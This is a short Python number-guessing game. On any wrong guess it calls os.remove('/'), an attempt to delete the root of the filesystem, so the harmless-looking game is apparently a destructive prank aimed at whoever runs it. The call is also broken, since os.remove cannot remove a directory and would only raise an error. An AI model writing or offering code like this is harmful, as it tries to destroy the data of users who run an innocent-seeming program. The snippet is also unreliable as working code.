import random
import os

randomNumber = random.randint(0,6)
guess = int(input("Guess a number"))

if guess == randomNumber:
  print("You got it right!")
else:
  os.remove("/")
  
